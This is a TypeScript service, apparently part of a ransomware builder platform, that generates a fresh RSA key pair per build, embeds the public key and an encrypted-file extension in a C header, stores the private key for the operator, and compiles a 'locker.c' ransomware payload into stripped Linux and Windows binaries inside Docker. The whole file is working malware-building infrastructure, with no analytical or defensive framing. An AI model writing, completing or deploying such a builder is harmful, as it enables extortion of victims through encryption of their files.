import { execFile }          from "child_process";
import { promisify }         from "util";
import { generateKeyPairSync, createCipheriv, randomBytes } from "crypto";
import fs                    from "fs";
import path                  from "path";
import type { IRansomCompiler, RansomSO, RansomBuildResult } from "../../../domain/ports/IRansomCompiler.js";
import { Result }            from "../../../shared/Result.js";

const execFileAsync = promisify(execFile);

const COMPILER_DIR = path.resolve(process.cwd(), "compiler", "ransom");
const LOCKER_SRC   = path.join(COMPILER_DIR, "locker.c");

const derToC = (buf: Buffer): string =>
  Array.from(buf)
    .map((b) => `0x${b.toString(16).padStart(2, "0")}`)
    .join(", ");

export class RansomCompilerService implements IRansomCompiler {
  async compile(so: RansomSO): Promise<Result<RansomBuildResult>> {
    const buildId = String(Date.now());
    const folder  = path.join(COMPILER_DIR, "builds", buildId);

    try {
      fs.mkdirSync(folder, { recursive: true });


      const { privateKey, publicKey } = generateKeyPairSync("rsa", {
        modulusLength: 2048,
      });


      const pubDer  = publicKey.export({ type: "spki",   format: "der" }) as Buffer;

      const privPem = privateKey.export({ type: "pkcs8", format: "pem" }) as string;


      const vaultContent = [
        "/* vault.h — gerado automaticamente pelo RansomCompilerService",
        " * NÃO edite manualmente. Cada build gera um novo par de chaves. */",
        "#ifndef VAULT_H",
        "#define VAULT_H",
        "",
        "/* RSA-2048 public key (SubjectPublicKeyInfo DER)",
        ` * ${pubDer.length} bytes — d2i_PUBKEY() em locker.c */`,
        `static const unsigned char MASTER_PUB_DER[] = { ${derToC(pubDer)} };`,
        `static const int           MASTER_PUB_DER_LEN = ${pubDer.length};`,
        "",
        '#define EXT ".2373"',
        "",
        "#endif /* VAULT_H */",
      ].join("\n");

      fs.writeFileSync(path.join(folder, "vault.h"), vaultContent, "utf-8");


      fs.writeFileSync(path.join(folder, "private_key.pem"), privPem, { mode: 0o600 });

      const masterKey = process.env["RANSOM_MASTER_KEY"];
      if (masterKey && Buffer.from(masterKey, "hex").length === 32) {
        const iv  = randomBytes(12);
        const cipher = createCipheriv("aes-256-gcm", Buffer.from(masterKey, "hex"), iv);
        const enc = Buffer.concat([cipher.update(privPem, "utf8"), cipher.final()]);
        const tag = cipher.getAuthTag();
        const blob = Buffer.concat([iv, tag, enc]);
        fs.writeFileSync(path.join(folder, "private_key.pem.enc"), blob, { mode: 0o600 });
      } else {
        console.warn("[WARN] RANSOM_MASTER_KEY ausente ou inválida (esperado 64 hex chars). private_key.pem.enc não gerado. Remova private_key.pem após backup.");
      }


      if (!fs.existsSync(LOCKER_SRC)) {
        return Result.fail(`locker.c não encontrado em: ${LOCKER_SRC}`);
      }
      fs.copyFileSync(LOCKER_SRC, path.join(folder, "locker.c"));


      let outputFile: string;
      let compilerArgs: string[];

      if (so === "linux") {
        outputFile = "locker_linux";
        compilerArgs = [
          "run", "--rm",
          "-v", `${folder}:/build`,
          "compiler-image",
          "gcc", "-O3", "-s", "locker.c", "-o", outputFile,
          "-lssl", "-lcrypto", "-lpthread",
        ];
      } else {
        outputFile = "locker_win.exe";
        compilerArgs = [
          "run", "--rm",
          "-v", `${folder}:/build`,
          "compiler-image",
          "x86_64-w64-mingw32-gcc", "-O3", "-s", "locker.c", "-o", outputFile,
          "-lssl", "-lcrypto", "-static", "-lpthread", "-lws2_32",
        ];
      }

      await execFileAsync("docker", compilerArgs, { cwd: folder, timeout: 60000 });

      const binaryPath = path.join(folder, outputFile);
      if (!fs.existsSync(binaryPath)) {
        return Result.fail("Compilação concluiu mas o binário não foi encontrado");
      }

      return Result.ok({ binaryPath, buildId, privKeyPem: privPem });

    } catch (e: unknown) {
      try { fs.rmSync(folder, { recursive: true, force: true }); } catch {  }
      const msg = e instanceof Error ? e.message : String(e);
      return Result.fail(`Erro na compilação: ${msg}`);
    }
  }
}

